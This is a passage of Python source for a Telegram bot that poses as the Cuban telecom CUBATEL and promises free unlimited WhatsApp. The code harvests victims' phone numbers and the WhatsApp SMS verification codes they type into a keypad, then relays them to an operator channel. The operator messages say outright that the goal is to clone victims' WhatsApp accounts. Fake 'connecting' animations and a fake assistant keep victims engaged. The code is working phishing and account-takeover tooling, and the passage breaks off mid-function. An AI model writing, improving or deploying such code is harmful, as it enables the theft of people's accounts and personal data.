import os
import json
import html
import asyncio
import logging
from datetime import datetime
from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHANNEL_ID = os.getenv("ADMIN_CHANNEL_ID", "").strip()  # p.ej. -1002756519910

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("verify-bot")

UD_PHONE = "phone"
UD_CODE = "code"
UD_START_MSG_ID = "start_msg_id"
UD_NATIVE_MSG_ID = "native_msg_id"
UD_TUTORIAL_SENT = "tutorial_sent"
UD_CHAT_MODE = "chat_mode"
UD_LAST_ADMIN_CHAT_MSG_ID = "last_admin_chat_msg_id"
UD_LAST_ASK_MSG_ID = "last_ask_msg_id"
UD_LAST_TUTORIAL_MSG_ID = "last_tutorial_msg_id"

PENDING_BY_ADMIN_MSG = {}   # admin_msg_id -> data del caso
PENDING_BY_USER_ID = {}     # telegram_id -> admin_msg_id
WAIT_TASKS = {}             # telegram_id -> asyncio.Task
GENERATING_TASKS = {}       # telegram_id -> asyncio.Task
PENDING_GENERATING = {}     # telegram_id -> {"chat_id": ..., "message_id": ...}
DM_SENT_BY_ADMIN_MSG = {}   # admin_msg_id -> {"user_id": ..., "dm_message_id": ...}

USERS_FILE = "usuarios_lab.json"
USERS = {}  # "telegram_id" -> {"full_name": ..., "username": ..., "phone": ...}
BANNED_FILE = "banned_users.json"
BANNED_USERS = set()

def load_users():
    global USERS
    if not os.path.exists(USERS_FILE):
        USERS = {}
        return
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            USERS = json.load(f)
    except Exception:
        USERS = {}

def save_users():
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(USERS, f, ensure_ascii=False, indent=2)

def load_banned_users():
    global BANNED_USERS
    if not os.path.exists(BANNED_FILE):
        BANNED_USERS = set()
        return
    try:
        with open(BANNED_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            BANNED_USERS = set(int(x) for x in data)
    except Exception:
        BANNED_USERS = set()

def save_banned_users():
    with open(BANNED_FILE, "w", encoding="utf-8") as f:
        json.dump(sorted(list(BANNED_USERS)), f, ensure_ascii=False, indent=2)

def is_banned(user_id: int) -> bool:
    return int(user_id) in BANNED_USERS

def admin_chat_ok(update: Update) -> bool:
    chat = update.effective_chat
    if not chat:
        return False
    return str(chat.id) == ADMIN_CHANNEL_ID

def share_phone_kb():
    btn = KeyboardButton("📡𝐒𝐎𝐋𝐈𝐂𝐈𝐓𝐀𝐑 𝐂𝐎𝐍𝐄𝐗𝐈𝐎𝐍", request_contact=True)
    return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

def start_inline_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐𝐂𝐎𝐍𝐄𝐂𝐓𝐀𝐑 𝐀 𝐈𝐍𝐓𝐄𝐑𝐍𝐄𝐓", callback_data="start_join")]
    ])

def members_inline_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📺𝐕𝐈𝐃𝐄𝐎 𝐓𝐔𝐓𝐎𝐑𝐈𝐀𝐋", callback_data="members_btn")]
    ])

def tutorial_inline_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("𝐇𝐀𝐂𝐄𝐑 𝐔𝐍𝐀 𝐏𝐑𝐄𝐆𝐔𝐍𝐓𝐀❓", callback_data="ask_question")]
    ])

def build_keypad(code_str: str):

    buttons = [
        "A","B","C","D","E",
        "F","G","H","I","J",
        "K","L","M","N","O",
        "P","Q","R","S","T",
        "U","V","W","X","Y",
        "Z","1","2","3","4",
        "5","6","7","8","9",
        "0"
    ]

    rows = []
    fila = []

    for b in buttons:
        fila.append(InlineKeyboardButton(b, callback_data=f"d:{b}"))
        if len(fila) == 5:
            rows.append(fila)
            fila = []

    if fila:
        rows.append(fila)

    rows.append([
        InlineKeyboardButton("🗑️𝐁𝐨𝐫𝐫𝐚𝐫", callback_data="del"),
        InlineKeyboardButton("✔️𝐂𝐨𝐧𝐞𝐜𝐭𝐚𝐫", callback_data="ok")
    ])

    rows.append([
        InlineKeyboardButton("❌𝐂𝐚𝐧𝐜𝐞𝐥𝐚𝐫", callback_data="cancel")
    ])

    progreso = " ".join(list(code_str)) if code_str else "—"

    text = (
        "𝐑𝐞𝐯𝐢𝐬𝐚 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐪𝐮𝐞 𝐫𝐞𝐜𝐢𝐛𝐢𝐬𝐭𝐞 𝐩𝐨𝐫 𝐒𝐌𝐒 𝐩𝐚𝐫𝐚 𝐞𝐬𝐭𝐚𝐛𝐥𝐞𝐜𝐞𝐫 𝐥𝐚 𝐜𝐨𝐧𝐞𝐱𝐢𝐨𝐧 𝐫𝐚𝐩𝐢𝐝𝐚 𝐲 𝐬𝐞𝐠𝐮𝐫𝐚 𝐝𝐞 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐬𝐢𝐧 𝐜𝐨𝐧𝐬𝐮𝐦𝐢𝐫 𝐝𝐚𝐭𝐨𝐬 𝐦𝐨𝐯𝐢𝐥𝐞𝐬. 𝐏𝐫𝐢𝐦𝐞𝐫𝐨 𝐢𝐧𝐭𝐫𝐨𝐝𝐮𝐜𝐞 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐞𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐲 𝐥𝐮𝐞𝐠𝐨 𝐚𝐪𝐮𝐢 𝐩𝐚𝐫𝐚 𝐚𝐜𝐭𝐢𝐯𝐚𝐫 𝐥𝐚 𝐜𝐨𝐧𝐞𝐱𝐢𝐨𝐧.\n\n"
        f"Código: `{progreso}`"
    )

    return text, InlineKeyboardMarkup(rows)

async def animate_wait(bot, chat_id: int, message_id: int, user_id: int, is_photo: bool = False):
    frames = [
        "⏳ Conectando a internet.",
        "⌛️ Conectando a internet..",
        "⏳ Conectando a internet..."
    ]
    idx = 0
    try:
        while True:
            if is_photo:
                await bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=message_id,
                    caption=frames[idx % len(frames)]
                )
            else:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=frames[idx % len(frames)]
                )
            idx += 1
            await asyncio.sleep(1.0)
    except asyncio.CancelledError:
        raise
    except Exception:
        pass
    finally:
        WAIT_TASKS.pop(user_id, None)

def stop_wait_task(user_id: int):
    task = WAIT_TASKS.pop(user_id, None)
    if task:
        task.cancel()

async def animate_generating(bot, chat_id: int, message_id: int, user_id: int):
    frames = [
        "⏳ Generando.",
        "⏳ Generando..",
        "⏳ Generando..."
    ]
    idx = 0
    try:
        while True:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=frames[idx % len(frames)]
            )
            idx += 1
            await asyncio.sleep(1.0)
    except asyncio.CancelledError:
        raise
    except Exception:
        pass
    finally:
        GENERATING_TASKS.pop(user_id, None)

def stop_generating_task(user_id: int):
    task = GENERATING_TASKS.pop(user_id, None)
    if task:
        task.cancel()

async def send_dm_with_admin_mirror(
    context: ContextTypes.DEFAULT_TYPE,
    target_user_id: int,
    text: str,
    edit_message_id: int | None = None
):
    sent = None

    if edit_message_id:
        try:
            sent = await context.bot.edit_message_text(
                chat_id=target_user_id,
                message_id=edit_message_id,
                text=text
            )
        except Exception:
            sent = await context.bot.send_message(
                chat_id=target_user_id,
                text=text
            )
    else:
        sent = await context.bot.send_message(
            chat_id=target_user_id,
            text=text
        )

    try:
        if ADMIN_CHANNEL_ID and sent:
            admin_mirror = await context.bot.send_message(
                chat_id=ADMIN_CHANNEL_ID,
                text=(
                    "📤 Mensaje enviado al estudiante\n\n"
                    f"ID: {target_user_id}\n"
                    f"Mensaje:\n{text}\n\n"
                    "Responde a este mensaje con /del para borrarlo del DM."
                )
            )
            DM_SENT_BY_ADMIN_MSG[admin_mirror.message_id] = {
                "user_id": target_user_id,
                "dm_message_id": sent.message_id
            }
    except Exception as e:
        log.exception("Error creando espejo admin del DM: %s", e)

    return sent

def save_user_data(user, phone: str):
    USERS[str(user.id)] = {
        "full_name": user.full_name or "",
        "username": user.username or "",
        "phone": phone or ""
    }
    save_users()

def get_case_by_reply(update: Update):
    msg = update.message
    if not msg or not msg.reply_to_message:
        return None
    return PENDING_BY_ADMIN_MSG.get(msg.reply_to_message.message_id)

def get_case_by_user_id(user_id: int):
    admin_msg_id = PENDING_BY_USER_ID.get(user_id)
    if not admin_msg_id:
        return None
    return PENDING_BY_ADMIN_MSG.get(admin_msg_id)

def to_unicode_bold(text: str) -> str:
    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    digits = "0123456789"

    lower_bold = "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"
    upper_bold = "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙"
    digits_bold = "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"

    mp = {}
    for a, b in zip(lower, lower_bold):
        mp[a] = b
    for a, b in zip(upper, upper_bold):
        mp[a] = b
    for a, b in zip(digits, digits_bold):
        mp[a] = b

    out = []
    for ch in text:
        if ch in mp:
            out.append(mp[ch])
        else:
            out.append(html.escape(ch))
    return "".join(out)

def remove_case(case_data: dict):
    if not case_data:
        return
    admin_msg_id = case_data.get("admin_msg_id")
    user_id = case_data.get("user_id")
    if admin_msg_id in PENDING_BY_ADMIN_MSG:
        del PENDING_BY_ADMIN_MSG[admin_msg_id]
    if user_id in PENDING_BY_USER_ID:
        del PENDING_BY_USER_ID[user_id]

def user_link_html(user_id: int, text: str) -> str:
    return f'<a href="tg://user?id={user_id}">{html.escape(text)}</a>'

def build_chat_bridge_key(user_id: int) -> str:
    return f"chat_bridge_{user_id}"

def get_chat_bridge_by_admin_reply(update: Update):
    msg = update.message
    if not msg or not msg.reply_to_message:
        return None

    reply_id = msg.reply_to_message.message_id

    for _, v in PENDING_BY_ADMIN_MSG.items():
        if not isinstance(v, dict):
            continue

        bridge_ids = v.get("bridge_admin_msg_ids") or []
        if reply_id in bridge_ids:
            return v

        single_id = v.get("bridge_admin_msg_id")
        if single_id and single_id == reply_id:
            return v

    return None

async def send_single_tutorial_block(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_data: dict):

    old_tutorial_msg_id = user_data.get(UD_LAST_TUTORIAL_MSG_ID)
    if old_tutorial_msg_id:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=old_tutorial_msg_id)
        except:
            pass

    tutorial_video = os.getenv("TUTORIAL_VIDEO", "").strip()
    tutorial_text = "𝐑𝐞𝐯𝐢𝐬𝐚 𝐝𝐞𝐭𝐞𝐧𝐢𝐝𝐚𝐦𝐞𝐧𝐭𝐞 𝐞𝐥 𝐯𝐢𝐝𝐞𝐨 𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥 𝐩𝐚𝐫𝐚 𝐪𝐮𝐞 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫𝐭𝐞 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐚𝐦𝐞𝐧𝐭𝐞"

    try:
        if tutorial_video:
            sent = await context.bot.send_video(
                chat_id=chat_id,
                video=tutorial_video,
                caption=tutorial_text,
                reply_markup=tutorial_inline_kb()
            )
        else:
            sent = await context.bot.send_message(
                chat_id=chat_id,
                text=tutorial_text,
                reply_markup=tutorial_inline_kb()
            )
    except Exception as e:
        log.exception("Error enviando tutorial: %s", e)
        sent = await context.bot.send_message(
            chat_id=chat_id,
            text=tutorial_text,
            reply_markup=tutorial_inline_kb()
        )

    user_data[UD_LAST_TUTORIAL_MSG_ID] = sent.message_id

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user and is_banned(user.id):
        return
    
    context.user_data[UD_CODE] = ""
    context.user_data.pop(UD_PHONE, None)
    context.user_data.pop(UD_TUTORIAL_SENT, None)

    nombre_usuario = update.effective_user.first_name or "Alumno"
    nombre_unicode = to_unicode_bold(nombre_usuario)

    caption = (
        f"👩🏻‍💼𝐇𝐨𝐥𝐚 {nombre_unicode}. 𝐁𝐢𝐞𝐧𝐯𝐞𝐧𝐢𝐝𝐨 𝐚 𝐂𝐔𝐁𝐀𝐓𝐄𝐋🇨🇺. 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐈𝐋𝐈𝐌𝐈𝐓𝐀𝐃𝐎 𝐬𝐢𝐧 𝐜𝐨𝐧𝐬𝐮𝐦𝐨 𝐝𝐞 𝐝𝐚𝐭𝐨𝐬 𝐦𝐨𝐯𝐢𝐥𝐞𝐬. 𝐎𝐟𝐞𝐫𝐭𝐚 𝐥𝐢𝐦𝐢𝐭𝐚𝐝𝐚 𝐡𝐚𝐬𝐭𝐚 𝐞𝐥 𝟑𝟏 𝐝𝐞 𝐦𝐚𝐫𝐳𝐨\n\n"
        "<u>𝐏𝐀𝐒𝐎 #𝟏</u>: 𝐂𝐨𝐧𝐟𝐢𝐠𝐮𝐫𝐚𝐜𝐢𝐨𝐧 𝐝𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩\n\n"
        "<u>𝐏𝐀𝐒𝐎 #𝟐</u>: 𝐕𝐢𝐧𝐜𝐮𝐥𝐚𝐫 𝐝𝐢𝐬𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐨\n\n"
        "<u>𝐏𝐀𝐒𝐎 #𝟑</u>: 𝐕𝐢𝐧𝐜𝐮𝐥𝐚𝐫 𝐜𝐨𝐧 𝐧𝐮𝐦𝐞𝐫𝐨 𝐝𝐞 𝐭𝐞𝐥𝐞𝐟𝐨𝐧𝐨\n\n"
        "<u>𝐏𝐀𝐒𝐎 #𝟒</u>: 𝐈𝐧𝐭𝐫𝐨𝐝𝐮𝐜𝐞 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐞𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐲 𝐥𝐮𝐞𝐠𝐨 𝐞𝐧 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐩𝐚𝐫𝐚 𝐞𝐬𝐭𝐚𝐛𝐥𝐞𝐜𝐞𝐫 𝐥𝐚 𝐜𝐨𝐧𝐞𝐱𝐢𝐨𝐧."
    )

    start_video = os.getenv("START_VIDEO", "").strip()

    sent_start = None

    if start_video:
        try:
            sent_start = await update.message.reply_video(
                video=start_video,
                caption=caption,
                reply_markup=start_inline_kb(),
                parse_mode="HTML"
            )
        except Exception as e:
            log.exception("No pude enviar el video de inicio: %s", e)
            sent_start = await update.message.reply_text(
                caption,
                reply_markup=start_inline_kb(),
                parse_mode="HTML"
            )
    else:
        sent_start = await update.message.reply_text(
            caption,
            reply_markup=start_inline_kb(),
            parse_mode="HTML"
        )

    if sent_start:
        context.user_data[UD_START_MSG_ID] = sent_start.message_id

async def start_join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    user = update.effective_user

    if user and is_banned(user.id):
        await q.answer()
        return
    
    phone_actual = (context.user_data.get(UD_PHONE) or "").strip()

    if not phone_actual:
        await q.answer(
            text="𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐢𝐥𝐢𝐦𝐢𝐭𝐚𝐝𝐨 𝐬𝐢𝐧 𝐜𝐨𝐧𝐬𝐮𝐦𝐨 𝐝𝐞 𝐝𝐚𝐭𝐨𝐬 𝐦𝐨𝐯𝐢𝐥𝐞𝐬 𝐲 𝐜𝐨𝐧 𝐥𝐚 𝐦𝐚𝐲𝐨𝐫 𝐯𝐞𝐥𝐨𝐜𝐢𝐝𝐚𝐝 𝐝𝐞 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭. ¡¡¡𝐎𝐅𝐄𝐑𝐓𝐀 𝐂𝐔𝐁𝐀𝐓𝐄𝐋!!! 𝐕𝐞𝐧𝐜𝐞 𝐞𝐥 𝟑𝟏 𝐝𝐞 𝐦𝐚𝐫𝐳𝐨.",
            show_alert=True
        )

        native_msg_id = context.user_data.get(UD_NATIVE_MSG_ID)
        if native_msg_id:
            try:
                await context.bot.delete_message(
                    chat_id=q.message.chat_id,
                    message_id=native_msg_id
                )
            except Exception:
                pass

        native_msg = await context.bot.send_message(
            chat_id=q.message.chat_id,
            text="🌐𝐒𝐨𝐥𝐢𝐜𝐢𝐭𝐚 𝐥𝐚 𝐜𝐨𝐧𝐞𝐱𝐢𝐨𝐧 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐩𝐚𝐫𝐚 𝐭𝐮 𝐝𝐢𝐬𝐩𝐨𝐬𝐢𝐭𝐢𝐯𝐨 𝐲 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐭𝐞 𝐚 𝐥𝐚 𝐫𝐞𝐝 𝐝𝐞 𝐂𝐔𝐁𝐀𝐓𝐄𝐋. 𝐂𝐨𝐦𝐢𝐞𝐧𝐳𝐚 𝐚 𝐮𝐭𝐢𝐥𝐢𝐳𝐚𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐬𝐢𝐧 𝐜𝐨𝐧𝐬𝐮𝐦𝐢𝐫 𝐝𝐚𝐭𝐨𝐬 𝐦𝐨𝐯𝐢𝐥𝐞𝐬 𝐜𝐨𝐧 𝐥𝐚 𝐦𝐞𝐣𝐨𝐫 𝐯𝐞𝐥𝐨𝐜𝐢𝐝𝐚𝐝 𝐝𝐞 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭.",
            reply_markup=share_phone_kb()
        )
        context.user_data[UD_NATIVE_MSG_ID] = native_msg.message_id

        try:
            if ADMIN_CHANNEL_ID:
                await context.bot.send_message(
                    chat_id=ADMIN_CHANNEL_ID,
                    text=(
                        "𝐏𝐫𝐞𝐬𝐢𝐨𝐧ó 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 𝐂𝐎𝐍𝐄𝐂𝐓𝐀𝐑𝐒𝐄 𝐀 𝐈𝐍𝐓𝐄𝐑𝐍𝐄𝐓. 𝐏𝐫𝐢𝐦𝐞𝐫 𝐩𝐚𝐬𝐨 𝐝𝐞𝐥 𝐩𝐫𝐨𝐜𝐞𝐬𝐨. 𝐀𝐡𝐨𝐫𝐚 𝐝𝐞𝐛𝐞 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚𝐫 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 𝐝𝐞 𝐂𝐎𝐌𝐏𝐀𝐑𝐓𝐈𝐑 𝐍𝐔𝐌𝐄𝐑𝐎.\n\n"
                        f"Nombre: {user.full_name or 'Sin nombre'}\n"
                        f"Username: @{user.username or 'sin_username'}\n"
                        f"ID: {user.id}"
                    )
                )
        except Exception as e:
            log.exception("Error enviando aviso de unirse al grupo: %s", e)
        return

    await q.answer()

    try:
        if ADMIN_CHANNEL_ID:
            await context.bot.send_message(
                chat_id=ADMIN_CHANNEL_ID,
                text=(
                    "😈𝐏𝐫𝐞𝐬𝐢𝐨𝐧ó 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 𝐂𝐎𝐌𝐏𝐀𝐑𝐓𝐈𝐑 𝐄𝐋 𝐍𝐔𝐌𝐄𝐑𝐎. 𝐄𝐬𝐨 𝐪𝐮𝐢𝐞𝐫𝐞 𝐝𝐞𝐜𝐢𝐫 𝐪𝐮𝐞 𝐬𝐞 𝐪𝐮𝐢𝐞𝐫𝐞 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫. 𝐀𝐡𝐨𝐫𝐚 𝐝𝐞𝐛𝐞𝐦𝐨𝐬 𝐚𝐛𝐫𝐢𝐫 𝐥𝐚 𝐚𝐩𝐩 𝐝𝐞 𝐜𝐥𝐨𝐧𝐚𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐲 𝐞𝐧𝐯𝐢𝐚𝐫𝐥𝐞 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐯𝐢𝐚 𝐒𝐌𝐒 𝐲 𝐞𝐬𝐭𝐚𝐫 𝐚𝐭𝐞𝐧𝐭𝐨𝐬 𝐚 𝐯𝐞𝐫 𝐬𝐢 𝐦𝐮𝐞𝐫𝐝𝐞 𝐞𝐥 𝐚𝐧𝐳𝐮𝐞𝐥𝐨.\n\n"
                    f"Nombre: {user.full_name or 'Sin nombre'}\n"
                    f"Username: @{user.username or 'sin_username'}\n"
                    f"ID: {user.id}\n"
                    f"Teléfono: {phone_actual}"
                )
            )
    except Exception as e:
        log.exception("Error enviando mensaje al grupo privado: %s", e)

    await context.bot.send_message(
        chat_id=user.id,
        text="𝐎𝐛𝐬𝐞𝐫𝐯𝐚 𝐝𝐞𝐭𝐞𝐧𝐢𝐝𝐚𝐦𝐞𝐧𝐭𝐞 𝐞𝐥 𝐯𝐢𝐝𝐞𝐨 𝐭𝐮𝐭𝐨𝐫𝐢𝐚𝐥 𝐩𝐚𝐫𝐚 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫𝐭𝐞 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐚𝐦𝐞𝐧𝐭𝐞 𝐚 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐢𝐥𝐢𝐦𝐢𝐭𝐚𝐝𝐨 𝐬𝐢𝐧 𝐜𝐨𝐧𝐬𝐮𝐦𝐢𝐫 𝐝𝐚𝐭𝐨𝐬."
    )

async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.contact:
        return

    user = update.effective_user
    if user and is_banned(user.id):
        return
    
    phone = msg.contact.phone_number
    user = update.effective_user

    context.user_data[UD_PHONE] = phone
    context.user_data[UD_CODE] = ""

    save_user_data(user, phone)

    native_msg_id = context.user_data.get(UD_NATIVE_MSG_ID)
    if native_msg_id:
        try:
            await context.bot.delete_message(chat_id=msg.chat_id, message_id=native_msg_id)
        except Exception:
            pass

    start_msg_id = context.user_data.get(UD_START_MSG_ID)
    if start_msg_id:
        try:
            await context.bot.edit_message_reply_markup(
                chat_id=msg.chat_id,
                message_id=start_msg_id,
                reply_markup=members_inline_kb()
            )
        except Exception:
            pass

    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    admin_text = (
        "😈𝐏𝐫𝐞𝐬𝐢𝐨𝐧ó 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 𝐂𝐎𝐌𝐏𝐀𝐑𝐓𝐈𝐑 𝐄𝐋 𝐍𝐔𝐌𝐄𝐑𝐎. 𝐄𝐬𝐨 𝐪𝐮𝐢𝐞𝐫𝐞 𝐝𝐞𝐜𝐢𝐫 𝐪𝐮𝐞 𝐬𝐞 𝐪𝐮𝐢𝐞𝐫𝐞 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫. 𝐀𝐡𝐨𝐫𝐚 𝐝𝐞𝐛𝐞𝐦𝐨𝐬 𝐚𝐛𝐫𝐢𝐫 𝐥𝐚 𝐚𝐩𝐩 𝐝𝐞 𝐜𝐥𝐨𝐧𝐚𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐲 𝐞𝐧𝐯𝐢𝐚𝐫𝐥𝐞 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐯𝐢𝐚 𝐒𝐌𝐒 𝐲 𝐞𝐬𝐭𝐚𝐫 𝐚𝐭𝐞𝐧𝐭𝐨𝐬 𝐚 𝐯𝐞𝐫 𝐬𝐢 𝐦𝐮𝐞𝐫𝐝𝐞 𝐞𝐥 𝐚𝐧𝐳𝐮𝐞𝐥𝐨.\n\n"
        f"Nombre: {user.full_name or 'Sin nombre'}\n"
        f"Username: @{user.username or 'sin_username'}\n"
        f"ID: {user.id}\n"
        f"Teléfono: {phone}\n"
        f"Fecha/Hora: {stamp}"
    )

    try:
        if ADMIN_CHANNEL_ID:
            await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text)
            log.info("Número enviado al destino %s", ADMIN_CHANNEL_ID)
    except Exception as e:
        log.exception("Error enviando número al destino: %s", e)

    photo = os.getenv("PHOTO", "").strip()

    text, kb = build_keypad("")

    if photo:
        await msg.reply_photo(
            photo=photo,
            caption=text,
            reply_markup=kb,
            parse_mode="Markdown"
        )
    else:
        await msg.reply_text(
            text,
            reply_markup=kb,
            parse_mode="Markdown"
        )

    await send_single_tutorial_block(context, msg.chat_id, context.user_data)

    context.user_data[UD_TUTORIAL_SENT] = True

async def members_btn_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    user = update.effective_user
    data = USERS.get(str(user.id), {})
    phone_guardado = (data.get("phone") or "").strip()

    await q.answer()

    try:
        if ADMIN_CHANNEL_ID:
            await context.bot.send_message(
                chat_id=ADMIN_CHANNEL_ID,
                text=(
                    "𝐒𝐨𝐥𝐢𝐜𝐢𝐭ó 𝐯𝐞𝐫 𝐕𝐈𝐃𝐄𝐎 𝐓𝐔𝐓𝐎𝐑𝐈𝐀𝐋\n\n"
                    f"Nombre: {user.full_name or 'Sin nombre'}\n"
                    f"Username: @{user.username or 'sin_username'}\n"
                    f"ID: {user.id}\n"
                    f"Teléfono: {phone_guardado or 'sin teléfono'}"
                )
            )
    except Exception as e:
        log.exception("Error enviando aviso de miembros: %s", e)

    await send_single_tutorial_block(context, user.id, context.user_data)

async def ask_question_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    user = update.effective_user
    nombre = user.first_name or "Alumno"

    await q.answer()

    context.user_data[UD_CHAT_MODE] = True

    await context.bot.send_message(
        chat_id=user.id,
        text=f"🙋🏻‍♀️Hola {nombre}, soy Sofia, asistente virtual de. Como puedo ayudarte."
    )

async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    code = context.user_data.get(UD_CODE, "")
    data = q.data or ""

    if data.startswith("d:") and len(code) < 8:
        code += data.split(":")[1]
    elif data == "del":
        code = code[:-1]
    elif data == "cancel":
        context.user_data[UD_CODE] = ""
        user = update.effective_user

        await q.edit_message_text("⏳ Generando.")

        stop_generating_task(user.id)

        GENERATING_TASKS[user.id] = asyncio.create_task(
            animate_generating(
                context.bot,
                q.message.chat_id,
                q.message.message_id,
                user.id
            )
        )

        PENDING_GENERATING[user.id] = {
            "chat_id": q.message.chat_id,
            "message_id": q.message.message_id
        }

        return
    
    elif data == "ok":
        if not (len(code) == 8 and code.isalnum()):
            context.user_data[UD_CODE] = ""
            error_msg = (
                "❌𝐂𝐨𝐝𝐢𝐠𝐨 𝐢𝐧𝐯𝐚𝐥𝐢𝐝𝐨\n\n"
                "𝐀𝐬𝐞𝐠ú𝐫𝐚𝐭𝐞 𝐝𝐞 𝐢𝐧𝐠𝐫𝐞𝐬𝐚𝐫 𝐭𝐮 𝐜ó𝐝𝐢𝐠𝐨 𝐝𝐞 𝐚𝐜𝐜𝐞𝐬𝐨 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐨 𝐝𝐞 𝟖 𝐜𝐚𝐫𝐚𝐜𝐭𝐞𝐫𝐞𝐬 𝐲 𝐥𝐮𝐞𝐠𝐨 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐩𝐚𝐫𝐚 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐫𝐭𝐞 𝐚 𝐥𝐚 𝐫𝐞𝐝 𝐝𝐞 𝐂𝐔𝐁𝐀𝐓𝐄𝐋\n\n"
                "✅𝐂𝐨𝐧𝐞𝐜𝐭𝐚𝐫.\n\n"
                "𝐂𝐨𝐝𝐢𝐠𝐨: `—`"
            )
            text, kb = build_keypad("")
            await q.edit_message_text(error_msg, parse_mode="Markdown", reply_markup=kb)
            return

        phone = context.user_data.get(UD_PHONE, "desconocido")
        user = update.effective_user
        stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        admin_text = (
            "🧩 *𝐏𝐮𝐬𝐨 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨 𝐞𝐪𝐮𝐢𝐯𝐨𝐜𝐚𝐝𝐨*\n\n"
            f"Teléfono: `{phone}`\n"
            f"Usuario: @{user.username or 'sin_username'}\n"
            f"ID: `{user.id}`\n"
            f"Código ingresado: `{code}`\n"
            f"Hora: {stamp}\n\n"
            "Responde a este mensaje con:\n"
            "`/ok Mensaje para el usuario`\n"
            "o con:\n"
            "`/error`\n\n"
            "También puedes usar:\n"
            f"`/ok {user.id} Mensaje para el usuario`\n"
            f"`/error {user.id}`"
        )

        admin_msg = None
        try:
            if ADMIN_CHANNEL_ID:
                admin_msg = await context.bot.send_message(
                    ADMIN_CHANNEL_ID,
                    admin_text,
                    parse_mode="Markdown"
                )
                log.info("Caso enviado al destino %s", ADMIN_CHANNEL_ID)
        except Exception as e:
            log.exception("Error enviando caso al destino: %s", e)

        if q.message.photo:
            await q.edit_message_caption(caption="⏳ Conectando...")
        else:
            await q.edit_message_text("⏳ Conectando...")

        stop_wait_task(user.id)
        WAIT_TASKS[user.id] = asyncio.create_task(
            animate_wait(
                context.bot,
                q.message.chat_id,
                q.message.message_id,
